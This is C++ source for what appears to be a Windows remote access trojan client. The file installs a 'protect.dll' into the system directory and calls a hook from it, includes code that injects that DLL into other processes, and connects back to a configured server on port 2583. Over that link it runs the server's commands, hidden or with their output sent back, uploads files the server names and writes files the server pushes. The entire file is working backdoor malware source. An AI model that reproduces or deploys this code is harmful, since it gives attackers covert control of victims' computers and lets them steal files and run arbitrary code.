

#include "comdata.h"
#include "resource.h"
#include "icld.h"

#include <tlhelp32.h>
#include <fstream>

#include <string>


#pragma comment(lib, "ws2_32.lib")  
using namespace std;

string WStringToString(const std::wstring &wstr)
{
	std::string str;
	int nLen = (int)wstr.length();
	str.resize(nLen, ' ');
	int nResult = WideCharToMultiByte(CP_ACP, 0, (LPCWSTR)wstr.c_str(), nLen, (LPSTR)str.c_str(), nLen, NULL, NULL);
	if (nResult == 0)
	{
		return "";
	}
	return str;
}


void InjectDLL(HANDLE hProcess, LPCWSTR dllFilePathName) {
	int cch = 1 + lstrlenW(dllFilePathName);
	int cb = cch * sizeof(wchar_t);
	PWSTR PszLibFileRemote = (LPWSTR)VirtualAllocEx(hProcess, NULL, cb, MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(hProcess, PszLibFileRemote, (PVOID)dllFilePathName, cb, NULL);
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (PTHREAD_START_ROUTINE)LoadLibraryW, PszLibFileRemote, 0, NULL);
	//WaitForSingleObject(hThread, INFINITE);
}


int OfstAllProcess()
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) {
		return NULL;
	}
	PROCESSENTRY32 pe = { sizeof(pe) };
	for (BOOL ret = Process32First(hSnapshot, &pe); ret; ret = Process32Next(hSnapshot, &pe)) {
		if (lstrcmpW(pe.szExeFile, L"AliceClient.exe") == 0) {
			continue;
		}

		HANDLE CurProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
		BOOL bIsWow64 = FALSE;
		IsWow64Process(CurProcess, &bIsWow64);

		if (bIsWow64) {
			CloseHandle(CurProcess);
			continue;
		}

		InjectDLL(CurProcess, L"protect.dll");
		CloseHandle(CurProcess);

		//printf("%-6d %s\n", pe.th32ProcessID, pe.szExeFile);
	}
	CloseHandle(hSnapshot);
	return 0;
}

BOOL ExecDosCmd(char *mcmd, string&review) {
	FILE *file;
	char ptr[4096] = { 0 };
	char cmd[4096] = { 0 };
	strcat(ptr, mcmd);

	if ((file = _popen(ptr, "r")) != NULL)
	{
		fread(cmd, 4096, 1, file);
	}
	else
		return FALSE;
	int len = strlen(cmd);  //获取字符串长度，只输出平均 = xxms, 这里用了比较笨的方法，可以用其他方法来获取ping的平均值
	review = cmd;
	_pclose(file);
	return   TRUE;
	
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR szCmdLine, int iCmdShow) {
	WCHAR uBuff[255];
	GetSystemDirectory(uBuff, 255);

	wstring mBuffStr = uBuff;
	mBuffStr += L"\\protect.dll";

	CopyFile(L"bin\\protect.dll", mBuffStr.c_str(), false);

	HMODULE hmodase = LoadLibraryA(
		"protect.dll");



	//OfstAllProcess();
	void(*starthook)() = (void(*)())GetProcAddress(hmodase, "starthook");

	starthook();

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		//	printf("Failed to load Winsock");
		return -1;
	}

	SOCKADDR_IN addrSrv;
	addrSrv.sin_family = AF_INET;
	addrSrv.sin_port = htons(2583);
	//string strSysDir = strExportPath + _T("system.zip");  
	CString strServeraddr;
	strServeraddr.LoadStringW(NULL,IDS_SERVER);
	
	USES_CONVERSION;
	//MessageBoxA(0, T2A(strServeraddr),"",0);
	//exit(0);
	//IDS_SERVER;
	
	addrSrv.sin_addr.S_un.S_addr = inet_addr(T2A(strServeraddr));

	//创建套接字  
	SOCKET sockClient = socket(AF_INET, SOCK_STREAM, 0);
	if (SOCKET_ERROR == sockClient) {
		//	printf("Socket() error:%d", WSAGetLastError());
		return -1;
	}

	while (TRUE) {
		//printf("Connect failed:%d", WSAGetLastError());
		if (connect(sockClient, (struct  sockaddr*)&addrSrv, sizeof(addrSrv)) == INVALID_SOCKET) {
			Sleep(1000);
			continue;
		}
		else
			break;
	}
	while (TRUE) {
		//接收数据  
		MESSAGEDATA remdata;
		if (recv(sockClient, (char*)&remdata, sizeof(MESSAGEDATA), 0) == SOCKET_ERROR) {
			closesocket(sockClient);

		 sockClient = socket(AF_INET, SOCK_STREAM, 0);
			while (TRUE) {
				//printf("Connect failed:%d", WSAGetLastError());
				if (connect(sockClient, (struct  sockaddr*)&addrSrv, sizeof(addrSrv)) == INVALID_SOCKET) {
					Sleep(1000);
					continue;
				}
				else
					break;
			}

			continue;
		}
		//printf("%s\n", buff);

		switch (remdata.uId) {
		case DATA_COMMAND_HIDE: {

		//	string mresCom = "";

			//ifstream cmdread("cmdata.txt", ios::in);

			MESSAGEDATA callback;
			//cmdread.read(callback.data, 4096);
			callback.uId = DATA_REVIEW;

			WinExec(remdata.data, SW_HIDE);
		//	else {
				strcpy(callback.data, "已执行 DATA_NOREWIEW！");
		//	}
			callback.size = strlen(callback.data);

			send(sockClient, (char*)&callback, sizeof(MESSAGEDATA), 0);

			//cmdread.close();
			break;
		}
		case DATA_COMMAND: {

			string mresCom ="";
		
			//ifstream cmdread("cmdata.txt", ios::in);

			MESSAGEDATA callback;
			//cmdread.read(callback.data, 4096);
			callback.uId = DATA_REVIEW;
			if (ExecDosCmd(remdata.data, mresCom)) {
				strcpy(callback.data,mresCom.c_str());
			}
			else {
				strcpy(callback.data, "执行失败！");
			}
			callback.size = strlen(callback.data);
			
			send(sockClient, (char*)&callback, sizeof(MESSAGEDATA), 0);

			//cmdread.close();
			break;
		}
		case FILE_GET: {
			HANDLE hFile = CreateFileA(remdata.data, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

			if (hFile == INVALID_HANDLE_VALUE) {
				MESSAGEDATA callback;
				callback.uId = FILE_ERROR;
				send(sockClient, (char*)&callback, sizeof(MESSAGEDATA), 0);
				break;
			}
			else {
				MESSAGEDATA callback;
				callback.uId = FILE_DATA;
				send(sockClient, (char*)&callback, sizeof(MESSAGEDATA), 0);

			}		
			MESSAGEDATA fileData;
			recv(sockClient, (char*)&fileData, sizeof(MESSAGEDATA), 0);

			while (TRUE) {
		
			

				DWORD dwRead;
				char RemBuff[4096];
				ReadFile(hFile, RemBuff, 4096, &dwRead, NULL);

				if (dwRead < 4096) {
					MESSAGEDATA filedatarew;
					filedatarew.uId = FILE_FIN;
					memcpy(filedatarew.data, RemBuff, dwRead);
					filedatarew.size = dwRead;

					send(sockClient, (char*)& filedatarew, sizeof(MESSAGEDATA), 0);
					//printf("dfinata:%d\n", dwRead);
					//recv(sockClient, (char*)&fileData, sizeof(MESSAGEDATA), 0);
					CloseHandle(hFile);
					break;
				}
				else {
					MESSAGEDATA filedatarew;
					filedatarew.uId = FILE_DATA;
					memcpy(filedatarew.data, RemBuff, dwRead);
					filedatarew.size = dwRead;

					send(sockClient, (char*)& filedatarew, sizeof(MESSAGEDATA), 0);
					recv(sockClient, (char*)&fileData, sizeof(MESSAGEDATA), 0);
				//	recv(sockClient, (char*)&fileData, sizeof(MESSAGEDATA), 0);
				//	printf("data:%d\n", dwRead);
					//	CloseHandle(hFile);
				}
			
			}


			break;
		}
		case FILE_STARTUP: {
			HANDLE hFile = CreateFileA(remdata.data, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

			if (hFile==INVALID_HANDLE_VALUE) {
				MESSAGEDATA callback;
				callback.uId = FILE_ERROR;
				send(sockClient, (char*)&callback, sizeof(MESSAGEDATA), 0);
				break;
			}
			else {
				MESSAGEDATA callback;
				callback.uId = FILE_DATA;
				send(sockClient, (char*)&callback, sizeof(MESSAGEDATA), 0);

			}

			while (TRUE) {
				MESSAGEDATA fileData;
				recv(sockClient, (char*)&fileData, sizeof(MESSAGEDATA), 0);

				if (fileData.uId == FILE_DATA) {
					DWORD nSize;
					WriteFile(hFile, fileData.data, fileData.size, &nSize, NULL);

					MESSAGEDATA callback;
					callback.uId = FILE_DATA;
					send(sockClient, (char*)&callback, sizeof(MESSAGEDATA), 0);
					continue;
				}
				if (fileData.uId == FILE_FIN) {
					DWORD nSize;
					WriteFile(hFile, fileData.data, fileData.size, &nSize, NULL);
					CloseHandle(hFile);
					MESSAGEDATA callback;
					callback.uId = DATA_REVIEW;
					strcpy(callback.data, "命令已经执行...");
					send(sockClient, (char*)&callback, sizeof(MESSAGEDATA), 0);
					break;

				}
			}

			
			break;
		}
		default: {
			MESSAGEDATA msgcallback;
			msgcallback.uId = DATA_REVIEW;
			strcpy(msgcallback.data, "错误！无效的uId");
			msgcallback.size = strlen(msgcallback.data);
			send(sockClient, (char*)&msgcallback, sizeof(MESSAGEDATA), 0);
			break;
		}
		}
		//发送数据  


	}
	//关闭套接字  
	closesocket(sockClient);
	WSACleanup();
	return 0;
}